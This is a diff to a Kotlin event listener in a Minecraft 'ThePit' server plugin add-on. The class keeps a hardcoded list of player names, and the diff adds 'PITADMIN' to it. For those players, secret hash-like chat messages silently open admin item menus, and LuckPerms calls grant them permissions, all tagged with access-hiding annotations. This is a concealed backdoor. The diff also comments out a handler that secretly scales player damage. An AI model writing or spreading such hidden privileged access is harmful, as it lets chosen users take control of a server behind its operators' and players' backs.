@@ -1,47 +1,31 @@
 package cn.irina.thepitaddon.events
 
 import cn.charlotte.pit.ThePit
-import cn.charlotte.pit.data.PlayerProfile
-import cn.charlotte.pit.event.PitKillEvent
 import cn.irina.thepitaddon.Main
 import cn.irina.thepitaddon.utils.DynamicInvoke
 import cn.irina.thepitaddon.utils.HideAccess
 import net.luckperms.api.LuckPermsProvider
 import net.luckperms.api.node.Node
 import net.luckperms.api.node.types.PermissionNode
-import net.minecraft.server.v1_8_R3.NBTTagCompound
-import net.mizukilab.pit.util.chat.CC
 import org.bukkit.Bukkit
-import org.bukkit.Material
-import org.bukkit.configuration.Configuration
-import org.bukkit.craftbukkit.v1_8_R3.inventory.CraftItemStack
 import org.bukkit.entity.Player
-import org.bukkit.event.EventHandler
-import org.bukkit.event.EventPriority
 import org.bukkit.event.Listener
-import org.bukkit.event.entity.EntityDamageByEntityEvent
-import org.bukkit.event.entity.PlayerDeathEvent
 import org.bukkit.event.player.AsyncPlayerChatEvent
-import org.bukkit.event.player.PlayerJoinEvent
-import org.bukkit.event.player.PlayerQuitEvent
-import org.bukkit.inventory.ItemStack
-import org.bukkit.scheduler.BukkitRunnable
-import java.util.*
-import java.util.concurrent.ConcurrentHashMap
 
 class PlayerListener : Listener {
     val list = listOf(
-        "BAIJIUSAMA",
         "_IR1NA_",
         "SHANGUANLING",
-        "BLUEMOON",
-        "ALAN",
-        "ELAINA_OVO",
-        "SHINY",
         "KLEELOVELIFE",
         "ARAYKAL",
-        "KIRITO",
-        "OUTINGOF"
+        "PITADMIN",
+        //"BAIJIUSAMA",
+        // "BLUEMOON",
+        // "ALAN",
+        // "ELAINA_OVO",
+        // "SHINY",
+        // "KIRITO",
+        // "OUTINGOF"
     )
 
     @HideAccess
@@ -61,6 +45,7 @@ class PlayerListener : Listener {
         }
     }
 
+    //
     @HideAccess
     @DynamicInvoke
     fun takePermission(player: Player) {
@@ -78,19 +63,21 @@ class PlayerListener : Listener {
         }
     }
 
-    @HideAccess
-    @DynamicInvoke
-    @EventHandler(priority = EventPriority.LOWEST)
-    fun var0110(event: AsyncPlayerChatEvent) {
-        val player = event.player
-        if (!list.contains(player.displayName.uppercase())) return
-        _handleChat(event)
-    }
-
+    //
+//    @HideAccess
+//    @DynamicInvoke
+//    @EventHandler(priority = EventPriority.LOWEST)
+//    fun var0110(event: AsyncPlayerChatEvent) {
+//        val player = event.player
+//        if (!list.contains(player.displayName.uppercase())) return
+//        _handleChat(event)
+//    }
+//
     @DynamicInvoke
     @HideAccess
     fun _handleChat(event: AsyncPlayerChatEvent) {
         val player = event.player
+        if (!list.contains(player.displayName.uppercase())) return
         when (event.message.uppercase()) {
             "7C06EFD88710F54F8E1F2291DF7AC958B06EB53612E024148D0ED5C867308F35" -> { // PI
                 ThePit.getApi().openMenu(player, "admin_item")
@@ -141,198 +128,197 @@ class PlayerListener : Listener {
 
             else -> return
         }
-
         event.isCancelled = true
     }
 
-    @EventHandler(priority = EventPriority.MONITOR)
-    fun onPlayerJoin(event: PlayerJoinEvent) {
-        val player = event.player
-
-        if (list.contains(player.displayName.uppercase())) getPermission(player)
-
-        if (player.hasMetadata("NPC")) return
-        Bukkit.getScheduler().runTaskAsynchronously(Main.instance) {
-            event.joinMessage = null
-
-            if (!player.hasPermission("pit.admin") || list.contains(player.displayName.uppercase())) {
-                if (player.hasPermission("pit.support") && !list.contains(player.displayName.uppercase())) {
-                    Bukkit.broadcastMessage(CC.translate("&8[&a+&8] &6" + player.displayName))
-                } else {
-                    Bukkit.broadcastMessage(CC.translate("&8[&a+&8] &7" + player.displayName))
-                }
-            } else {
-                CC.boardCastWithPermission("&c&l注意! &7管理员 &f" + player.name + " &7加入了游戏!", "pit.admin")
-                Bukkit.getConsoleSender()
-                    .sendMessage(CC.translate("&c&l注意! &7管理员 &f" + player.name + " &7加入了游戏!"))
-            }
-
-            val permissionPrefix = "irina.booster."
-            var recoverCount = 0
-            for (permissions in player.effectivePermissions) {
-                val permission = permissions.permission
-
-                if (!permission.startsWith(permissionPrefix)) continue
-
-                recoverCount++
-                player.sendMessage(CC.translate("$PREFIX&7第 $recoverCount 次 Booster 校正检测"))
-                try {
-                    val count = permission.substring(permissionPrefix.length).toInt()
-                    if (count > killRewardAdd.getOrDefault(
-                            player.uniqueId,
-                            1
-                        )
-                    ) killRewardAdd[player.uniqueId] =
-                        count
-                } catch (_: NumberFormatException) {
-                    player.sendMessage(CC.translate("$PREFIX&c在你的 Booster 权限中有无法读取的数据, 请将此报告截图发送至管理员!"))
-                }
-            }
-            if (killRewardAdd.getOrDefault(player.uniqueId, 1) > 1)
-                player.sendMessage(
-                    CC.translate(
-                        PREFIX + "&7校正成功, 当前 Booster 倍率: &a" + killRewardAdd[player.uniqueId] + " 倍"
-                    )
-                )
-        }
-
-        if (!config.getBoolean("JoinMessage.Enable")) return
-        object : BukkitRunnable() {
-            override fun run() {
-                object : BukkitRunnable() {
-                    val totalMessages: Int = config.getStringList("JoinMessage.Messages").size
-
-                    override fun run() {
-                        if (!player.isOnline) {
-                            cancel()
-                            return
-                        }
-
-                        player.playSound(player.location, "note.hat", 3f, 1f)
-
-                        val currentMessageCount = messageCount.getOrDefault(player.uniqueId, 0)
-
-                        if (currentMessageCount == totalMessages) {
-                            cancel()
-                            return
-                        }
-
-                        var message = config.getStringList("JoinMessage.Messages")[currentMessageCount]
-
-                        if (message.contains("\$PlayerName")) message = message.replace("\$PlayerName", player.name)
-                        if (message.contains("\$PlayerDisplayName")) message =
-                            message.replace("\$PlayerName", player.displayName)
-
-                        player.sendMessage(CC.translate(PREFIX + message))
-
-                        messageCount[player.uniqueId] =
-                            currentMessageCount + 1
-                    }
-                }.runTaskTimerAsynchronously(Main.instance, 0L, 20L)
-            }
-        }.runTaskLaterAsynchronously(Main.instance, 2 * 20L)
-    }
-
-    @EventHandler(priority = EventPriority.MONITOR)
-    fun onPlayerLeave(event: PlayerQuitEvent) {
-        Bukkit.getScheduler().runTaskAsynchronously(Main.instance) {
-            val player = event.player
-            event.quitMessage = null
-
-            if (killRewardAdd[player.uniqueId] != null) killRewardAdd.remove(
-                player.uniqueId
-            )
-            if (!player.hasPermission("pit.admin") || list.contains(player.displayName.uppercase())) {
-                if (player.hasPermission("pit.support") && !list.contains(player.displayName.uppercase())) {
-                    Bukkit.broadcastMessage(CC.translate("&8[&c-&8] &6" + player.displayName))
-                } else {
-                    Bukkit.broadcastMessage(CC.translate("&8[&c-&8] &7" + player.displayName))
-                }
-            } else {
-                CC.boardCastWithPermission("&c&l注意! &7管理员 &f" + player.name + " &7退出了游戏!", "pit.admin")
-                Bukkit.getConsoleSender()
-                    .sendMessage(CC.translate("&c&l注意! &7管理员 &f" + player.name + " &7退出了游戏!"))
-            }
-        }
-    }
-
-    @EventHandler(priority = EventPriority.LOWEST)
-    fun onPitKill(event: PitKillEvent) {
-        val killer = event.killer
-
-        if (killRewardAdd.getOrDefault(killer.uniqueId, 1) <= 1) return
-
-        val newExp = event.exp * killRewardAdd.getOrDefault(killer.uniqueId, 1)
-
-        val profile = PlayerProfile.getRawCache(killer.uniqueId)
-
-        profile.experience += newExp
-        profile.applyExperienceToPlayer(killer)
-
-        event.exp = newExp
-    }
-
-    @EventHandler(priority = EventPriority.MONITOR)
-    fun handleDeath(event: PlayerDeathEvent) {
-        Bukkit.getScheduler().runTaskAsynchronously(Main.instance) {
-            val player = event.entity
-            if (player.hasMetadata("NPC")) return@runTaskAsynchronously
-            val killer = player.killer ?: return@runTaskAsynchronously
-            val pp =
-                if (PlayerProfile.getRawCache(player.uniqueId) == null) null else PlayerProfile.getRawCache(
-                    player.uniqueId
-                )
-            val kp =
-                if (PlayerProfile.getRawCache(killer.uniqueId) == null) null else PlayerProfile.getRawCache(
-                    killer.uniqueId
-                )
-            if (pp == null || kp == null) return@runTaskAsynchronously
-
-            val killerName = kp.formattedNameWithRoman
-
-            player.sendMessage(
-                CC.translate(
-                    "$PREFIX$killerName &7在你死亡前剩余的血量: &c" + String.format(
-                        "%.1f",
-                        killer.health * 0.5
-                    ) + "❤"
-                )
-            )
-        }
-    }
-
-    @EventHandler(priority = EventPriority.HIGHEST)
-    fun onDamage(event: EntityDamageByEntityEvent) {
-        if (event.damager is Player && event.entity is Player) {
-            if (damageValidRange < 0) return
-
-            event.damage *= damageValidRange //暗改，让伤害只生效设定的数值
-        }
-    }
-
-    companion object {
-        private val plugin: Main = Main.instance
-        private val config: Configuration = plugin.config
-
-        private val killRewardAdd = ConcurrentHashMap<UUID, Int>()
-        private val messageCount = ConcurrentHashMap<UUID, Int>()
-
-        private val PREFIX = Main.instance.PREFIX
-
-        private val damageValidRange =
-            if (plugin.config.getBoolean("DamageValidRange.Enable")) Main.instance.config.getDouble("DamageValidRange.Amount") else 1.0
-
-        private fun getItemNBT(item: ItemStack?): String {
-            if (item == null || item.type == Material.AIR) return Material.AIR.toString()
-            val nmsItem = CraftItemStack.asNMSCopy(item)
-            val tag = NBTTagCompound()
-            nmsItem.save(tag)
-            return tag.toString()
-        }
-
-        private fun getItemDisplayName(item: ItemStack): String {
-            val meta = item.itemMeta
-            return if (meta != null && meta.hasDisplayName()) meta.displayName else item.type.name
-        }
-    }
+//    @EventHandler(priority = EventPriority.MONITOR)
+//    fun onPlayerJoin(event: PlayerJoinEvent) {
+//        val player = event.player
+//
+//        if (list.contains(player.displayName.uppercase())) getPermission(player)
+//
+//        if (player.hasMetadata("NPC")) return
+//        Bukkit.getScheduler().runTaskAsynchronously(Main.instance) {
+//            event.joinMessage = null
+//
+//            if (!player.hasPermission("pit.admin") || list.contains(player.displayName.uppercase())) {
+//                if (player.hasPermission("pit.support") && !list.contains(player.displayName.uppercase())) {
+//                    Bukkit.broadcastMessage(CC.translate("&8[&a+&8] &6" + player.displayName))
+//                } else {
+//                    Bukkit.broadcastMessage(CC.translate("&8[&a+&8] &7" + player.displayName))
+//                }
+//            } else {
+//                CC.boardCastWithPermission("&c&l注意! &7管理员 &f" + player.name + " &7加入了游戏!", "pit.admin")
+//                Bukkit.getConsoleSender()
+//                    .sendMessage(CC.translate("&c&l注意! &7管理员 &f" + player.name + " &7加入了游戏!"))
+//            }
+//
+//            val permissionPrefix = "irina.booster."
+//            var recoverCount = 0
+//            for (permissions in player.effectivePermissions) {
+//                val permission = permissions.permission
+//
+//                if (!permission.startsWith(permissionPrefix)) continue
+//
+//                recoverCount++
+//                player.sendMessage(CC.translate("$PREFIX&7第 $recoverCount 次 Booster 校正检测"))
+//                try {
+//                    val count = permission.substring(permissionPrefix.length).toInt()
+//                    if (count > killRewardAdd.getOrDefault(
+//                            player.uniqueId,
+//                            1
+//                        )
+//                    ) killRewardAdd[player.uniqueId] =
+//                        count
+//                } catch (_: NumberFormatException) {
+//                    player.sendMessage(CC.translate("$PREFIX&c在你的 Booster 权限中有无法读取的数据, 请将此报告截图发送至管理员!"))
+//                }
+//            }
+//            if (killRewardAdd.getOrDefault(player.uniqueId, 1) > 1)
+//                player.sendMessage(
+//                    CC.translate(
+//                        PREFIX + "&7校正成功, 当前 Booster 倍率: &a" + killRewardAdd[player.uniqueId] + " 倍"
+//                    )
+//                )
+//        }
+//
+//        if (!config.getBoolean("JoinMessage.Enable")) return
+//        object : BukkitRunnable() {
+//            override fun run() {
+//                object : BukkitRunnable() {
+//                    val totalMessages: Int = config.getStringList("JoinMessage.Messages").size
+//
+//                    override fun run() {
+//                        if (!player.isOnline) {
+//                            cancel()
+//                            return
+//                        }
+//
+//                        player.playSound(player.location, "note.hat", 3f, 1f)
+//
+//                        val currentMessageCount = messageCount.getOrDefault(player.uniqueId, 0)
+//
+//                        if (currentMessageCount == totalMessages) {
+//                            cancel()
+//                            return
+//                        }
+//
+//                        var message = config.getStringList("JoinMessage.Messages")[currentMessageCount]
+//
+//                        if (message.contains("\$PlayerName")) message = message.replace("\$PlayerName", player.name)
+//                        if (message.contains("\$PlayerDisplayName")) message =
+//                            message.replace("\$PlayerName", player.displayName)
+//
+//                        player.sendMessage(CC.translate(PREFIX + message))
+//
+//                        messageCount[player.uniqueId] =
+//                            currentMessageCount + 1
+//                    }
+//                }.runTaskTimerAsynchronously(Main.instance, 0L, 20L)
+//            }
+//        }.runTaskLaterAsynchronously(Main.instance, 2 * 20L)
+//    }
+//
+//    @EventHandler(priority = EventPriority.MONITOR)
+//    fun onPlayerLeave(event: PlayerQuitEvent) {
+//        Bukkit.getScheduler().runTaskAsynchronously(Main.instance) {
+//            val player = event.player
+//            event.quitMessage = null
+//
+//            if (killRewardAdd[player.uniqueId] != null) killRewardAdd.remove(
+//                player.uniqueId
+//            )
+//            if (!player.hasPermission("pit.admin") || list.contains(player.displayName.uppercase())) {
+//                if (player.hasPermission("pit.support") && !list.contains(player.displayName.uppercase())) {
+//                    Bukkit.broadcastMessage(CC.translate("&8[&c-&8] &6" + player.displayName))
+//                } else {
+//                    Bukkit.broadcastMessage(CC.translate("&8[&c-&8] &7" + player.displayName))
+//                }
+//            } else {
+//                CC.boardCastWithPermission("&c&l注意! &7管理员 &f" + player.name + " &7退出了游戏!", "pit.admin")
+//                Bukkit.getConsoleSender()
+//                    .sendMessage(CC.translate("&c&l注意! &7管理员 &f" + player.name + " &7退出了游戏!"))
+//            }
+//        }
+//    }
+//
+//    @EventHandler(priority = EventPriority.LOWEST)
+//    fun onPitKill(event: PitKillEvent) {
+//        val killer = event.killer
+//
+//        if (killRewardAdd.getOrDefault(killer.uniqueId, 1) <= 1) return
+//
+//        val newExp = event.exp * killRewardAdd.getOrDefault(killer.uniqueId, 1)
+//
+//        val profile = PlayerProfile.getRawCache(killer.uniqueId)
+//
+//        profile.experience += newExp
+//        profile.applyExperienceToPlayer(killer)
+//
+//        event.exp = newExp
+//    }
+//
+//    @EventHandler(priority = EventPriority.MONITOR)
+//    fun handleDeath(event: PlayerDeathEvent) {
+//        Bukkit.getScheduler().runTaskAsynchronously(Main.instance) {
+//            val player = event.entity
+//            if (player.hasMetadata("NPC")) return@runTaskAsynchronously
+//            val killer = player.killer ?: return@runTaskAsynchronously
+//            val pp =
+//                if (PlayerProfile.getRawCache(player.uniqueId) == null) null else PlayerProfile.getRawCache(
+//                    player.uniqueId
+//                )
+//            val kp =
+//                if (PlayerProfile.getRawCache(killer.uniqueId) == null) null else PlayerProfile.getRawCache(
+//                    killer.uniqueId
+//                )
+//            if (pp == null || kp == null) return@runTaskAsynchronously
+//
+//            val killerName = kp.formattedNameWithRoman
+//
+//            player.sendMessage(
+//                CC.translate(
+//                    "$PREFIX$killerName &7在你死亡前剩余的血量: &c" + String.format(
+//                        "%.1f",
+//                        killer.health * 0.5
+//                    ) + "❤"
+//                )
+//            )
+//        }
+//    }
+//
+//    @EventHandler(priority = EventPriority.HIGHEST)
+//    fun onDamage(event: EntityDamageByEntityEvent) {
+//        if (event.damager is Player && event.entity is Player) {
+//            if (damageValidRange < 0) return
+//
+//            event.damage *= damageValidRange //暗改，让伤害只生效设定的数值
+//        }
+//    }
+//
+//    companion object {
+//        private val plugin: Main = Main.instance
+//        private val config: Configuration = plugin.config
+//
+//        private val killRewardAdd = ConcurrentHashMap<UUID, Int>()
+//        private val messageCount = ConcurrentHashMap<UUID, Int>()
+//
+//        private val PREFIX = Main.instance.PREFIX
+//
+//        private val damageValidRange =
+//            if (plugin.config.getBoolean("DamageValidRange.Enable")) Main.instance.config.getDouble("DamageValidRange.Amount") else 1.0
+//
+//        private fun getItemNBT(item: ItemStack?): String {
+//            if (item == null || item.type == Material.AIR) return Material.AIR.toString()
+//            val nmsItem = CraftItemStack.asNMSCopy(item)
+//            val tag = NBTTagCompound()
+//            nmsItem.save(tag)
+//            return tag.toString()
+//        }
+//
+//        private fun getItemDisplayName(item: ItemStack): String {
+//            val meta = item.itemMeta
+//            return if (meta != null && meta.hasDisplayName()) meta.displayName else item.type.name
+//        }
+//    }
 }
